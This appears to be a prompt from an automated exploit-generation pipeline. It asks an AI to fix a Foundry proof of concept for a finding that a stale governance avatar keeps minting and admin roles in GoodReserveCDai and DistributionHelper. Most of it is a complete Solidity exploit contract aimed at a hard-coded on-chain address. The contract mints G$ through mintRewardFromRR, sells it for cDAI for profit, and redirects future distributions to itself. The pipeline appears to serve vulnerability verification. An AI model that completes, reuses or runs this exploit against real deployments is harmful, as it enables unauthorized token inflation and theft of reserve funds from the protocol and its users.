You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Governance rotation leaves former avatar with permanent reserve minting and helper admin powers
- claim: `GoodReserveCDai` and `DistributionHelper` snapshot the current `avatar` into `AccessControl` roles during initialization, but those roles are never revoked or automatically reassigned when `Controller.avatar()` changes. After governance rotation, the former avatar still keeps `RESERVE_MINTER_ROLE` on the reserve and `DEFAULT_ADMIN_ROLE` on the helper.
- impact: A stale governance key can continue minting G$ through `mintRewardFromRR` and can still reconfigure distribution recipients. Rotating governance therefore does not actually remove protocol control from the old avatar, enabling unauthorized inflation, value extraction, and long-lived control over where future distributions are sent.
- exploit_paths: ["DAO governance rotates `Controller.avatar()` to a new address", "The old avatar retains `RESERVE_MINTER_ROLE` in `GoodReserveCDai` and `DEFAULT_ADMIN_ROLE` in `DistributionHelper`", "The old avatar calls `mintRewardFromRR(...)` to mint G$ to itself and monetizes the new supply through the reserve/exchange flow", "The old avatar also calls `addOrUpdateRecipient(...)` to redirect future distributions"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface ITargetFundManager {
    function nameService() external view returns (address);
    function dao() external view returns (address);
}

interface INameServiceLike {
    function getAddress(string calldata name) external view returns (address);
}

interface IControllerLike {
    function avatar() external view returns (address);
    function genericCall(
        address _contract,
        bytes calldata _data,
        address _avatar,
        uint256 _value
    ) external returns (bool, bytes memory);
}

interface IAvatarLike {
    function owner() external view returns (address);
}

interface IAccessControlEnumerableLike {
    function getRoleMember(bytes32 role, uint256 index) external view returns (address);
    function getRoleMemberCount(bytes32 role) external view returns (uint256);
}

interface IMarketMakerLike {
    function sellReturn(address _token, uint256 _gdAmount) external view returns (uint256);
}

interface IReserveLike is IAccessControlEnumerableLike {
    function cDaiAddress() external view returns (address);
    function distributionHelper() external view returns (address);
    function getMarketMaker() external view returns (address);
    function cap() external view returns (uint256);
    function mintRewardFromRR(address _token, address _to, uint256 _amount) external;
    function sell(
        uint256 _gdAmount,
        uint256 _minReturn,
        address _target,
        address _seller
    ) external returns (uint256, uint256);
}

interface IDistributionHelperLike is IAccessControlEnumerableLike {
    struct DistributionRecipient {
        uint32 bps;
        uint32 chainId;
        address addr;
        uint8 transferType;
    }

    function addOrUpdateRecipient(DistributionRecipient calldata _recipient) external;
}

contract FlawVerifier {
    address internal constant TARGET = 0x0c6C80D2061afA35E160F3799411d83BDEEA0a5A;
    bytes32 internal constant RESERVE_MINTER_ROLE = keccak256("RESERVE_MINTER_ROLE");
    bytes32 internal constant DEFAULT_ADMIN_ROLE = 0x00;
    uint8 internal constant TRANSFER_TYPE_CONTRACT = 3;

    address internal _profitToken;
    uint256 internal _profitAmount;

    error MissingNameService();
    error MissingController();
    error MissingReserve();
    error MissingHelper();
    error MissingGoodDollar();
    error MissingCDai();
    error NoRoleRotationDetected(address currentAvatar);
    error NoCommonStaleAvatar(address currentAvatar);
    error StaleAvatarOwnerUnavailable(address staleAvatar, address ownerCandidate);
    error RemainingCapExhausted();
    error PublicControllerPathBlocked(address controller, address avatar, address target, bytes4 selector);
    error MintDidNotProduceGd();
    error SellDidNotProduceProfit();

    constructor() {}

    receive() external payable {}

    function onTokenTransfer(address, uint256, bytes calldata) external pure returns (bool) {
        return true;
    }

    function executeOnOpportunity() external {
        _profitToken = address(0);
        _profitAmount = 0;

        address nameService = ITargetFundManager(TARGET).nameService();
        if (nameService == address(0)) revert MissingNameService();

        address controller = INameServiceLike(nameService).getAddress("CONTROLLER");
        if (controller == address(0)) {
            controller = ITargetFundManager(TARGET).dao();
        }
        if (controller == address(0)) revert MissingController();

        address reserve = INameServiceLike(nameService).getAddress("RESERVE");
        if (reserve == address(0)) revert MissingReserve();

        address helper = IReserveLike(reserve).distributionHelper();
        if (helper == address(0)) {
            helper = INameServiceLike(nameService).getAddress("DISTRIBUTION_HELPER");
        }
        if (helper == address(0)) revert MissingHelper();

        address goodDollar = INameServiceLike(nameService).getAddress("GOODDOLLAR");
        if (goodDollar == address(0)) revert MissingGoodDollar();

        address cDai = IReserveLike(reserve).cDaiAddress();
        if (cDai == address(0)) {
            cDai = INameServiceLike(nameService).getAddress("CDAI");
        }
        if (cDai == address(0)) revert MissingCDai();

        address currentAvatar = IControllerLike(controller).avatar();
        address staleAvatar = _findCommonStaleAvatar(reserve, helper, currentAvatar);
        if (staleAvatar == address(0)) {
            if (_roleContains(IReserveLike(reserve), RESERVE_MINTER_ROLE, currentAvatar) &&
                _roleContains(IAccessControlEnumerableLike(helper), DEFAULT_ADMIN_ROLE, currentAvatar)) {
                revert NoRoleRotationDetected(currentAvatar);
            }
            revert NoCommonStaleAvatar(currentAvatar);
        }

        address staleController = IAvatarLike(staleAvatar).owner();
        if (staleController == address(0) && controller == address(0)) {
            revert StaleAvatarOwnerUnavailable(staleAvatar, staleController);
        }

        uint256 mintAmount = _selectMintAmount(reserve, cDai, goodDollar);
        uint256 gdBefore = IERC20Like(goodDollar).balanceOf(address(this));

        // Path stage 1-3: the stale avatar retained reserve minter rights and uses its controller path
        // to call mintRewardFromRR(...) on the reserve for the verifier.
        _requireGenericCall(
            controller,
            staleController,
            reserve,
            abi.encodeWithSelector(
                IReserveLike.mintRewardFromRR.selector,
                cDai,
                address(this),
                mintAmount
            ),
            staleAvatar,
            IReserveLike.mintRewardFromRR.selector
        );

        uint256 minted = IERC20Like(goodDollar).balanceOf(address(this)) - gdBefore;
        if (minted == 0) revert MintDidNotProduceGd();

        // Path stage 4: monetize the unauthorized G$ through the reserve sell flow into existing cDAI.
        uint256 cdaiBefore = IERC20Like(cDai).balanceOf(address(this));
        IERC20Like(goodDollar).approve(reserve, type(uint256).max);
        IReserveLike(reserve).sell(minted, 0, address(this), address(this));

        uint256 realized = IERC20Like(cDai).balanceOf(address(this)) - cdaiBefore;
        if (realized == 0) revert SellDidNotProduceProfit();

        // Path stage 5: the same stale avatar also retains helper admin and can redirect recipients.
        IDistributionHelperLike.DistributionRecipient memory recipient = IDistributionHelperLike
            .DistributionRecipient({
                bps: 1,
                chainId: 1,
                addr: address(this),
                transferType: TRANSFER_TYPE_CONTRACT
            });

        _requireGenericCall(
            controller,
            staleController,
            helper,
            abi.encodeWithSelector(
                IDistributionHelperLike.addOrUpdateRecipient.selector,
                recipient
            ),
            staleAvatar,
            IDistributionHelperLike.addOrUpdateRecipient.selector
        );

        _profitToken = cDai;
        _profitAmount = realized;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _findCommonStaleAvatar(
        address reserve,
        address helper,
        address currentAvatar
    ) internal view returns (address) {
        uint256 reserveCount = IReserveLike(reserve).getRoleMemberCount(RESERVE_MINTER_ROLE);
        uint256 helperCount = IAccessControlEnumerableLike(helper).getRoleMemberCount(DEFAULT_ADMIN_ROLE);

        for (uint256 i = 0; i < reserveCount; ++i) {
            address reserveMember = IReserveLike(reserve).getRoleMember(RESERVE_MINTER_ROLE, i);
            if (reserveMember == currentAvatar) {
                continue;
            }
            for (uint256 j = 0; j < helperCount; ++j) {
                address helperMember = IAccessControlEnumerableLike(helper).getRoleMember(DEFAULT_ADMIN_ROLE, j);
                if (reserveMember == helperMember) {
                    return reserveMember;
                }
            }
        }
        return address(0);
    }

    function _roleContains(
        IAccessControlEnumerableLike accessControl,
        bytes32 role,
        address candidate
    ) internal view returns (bool) {
        uint256 count = accessControl.getRoleMemberCount(role);
        for (uint256 i = 0; i < count; ++i) {
            if (accessControl.getRoleMember(role, i) == candidate) {
                return true;
            }
        }
        return false;
    }

    function _selectMintAmount(
        address reserve,
        address cDai,
        address goodDollar
    ) internal view returns (uint256) {
        uint256 reserveBalance = IERC20Like(cDai).balanceOf(reserve);
        uint256 remainingCap = IReserveLike(reserve).cap() - IERC20Like(goodDollar).totalSupply();
        if (remainingCap == 0) revert RemainingCapExhausted();

        address marketMaker = IReserveLike(reserve).getMarketMaker();
        uint256 targetCdaiOut = reserveBalance / 1000;
        if (targetCdaiOut == 0) {
            targetCdaiOut = 1;
        }

        uint256 low = 1;
        uint256 high = 1e6;

        while (high < remainingCap && IMarketMakerLike(marketMaker).sellReturn(cDai, high) < targetCdaiOut) {
            low = high;
            high <<= 1;
        }

        if (high > remainingCap) {
            high = remainingCap;
        }

        for (uint256 i = 0; i < 32 && low + 1 < high; ++i) {
            uint256 mid = low + ((high - low) >> 1);
            uint256 quote = IMarketMakerLike(marketMaker).sellReturn(cDai, mid);
            if (quote >= targetCdaiOut) {
                high = mid;
            } else {
                low = mid;
            }
        }

        return high == 0 ? 1 : high;
    }

    function _requireGenericCall(
        address currentController,
        address staleOwnerController,
        address target,
        bytes memory data,
        address avatar,
        bytes4 selector
    ) internal {
        if (_tryGenericCall(staleOwnerController, target, data, avatar)) {
            return;
        }
        if (currentController != staleOwnerController && _tryGenericCall(currentController, target, data, avatar)) {
            return;
        }
        revert PublicControllerPathBlocked(
            staleOwnerController.code.length > 0 ? staleOwnerController : currentController,
            avatar,
            target,
            selector
        );
    }

    function _tryGenericCall(
        address controller,
        address target,
        bytes memory data,
        address avatar
    ) internal returns (bool) {
        if (controller.code.length == 0) {
            return false;
        }

        (bool ok, bytes memory ret) = controller.call(
            abi.encodeWithSelector(
                IControllerLike.genericCall.selector,
                target,
                data,
                avatar,
                0
            )
        );

        if (!ok || ret.length < 64) {
            return false;
        }

        (bool success, ) = abi.decode(ret, (bool, bytes));
        return success;
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not cover paths indexes: 0, 3
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
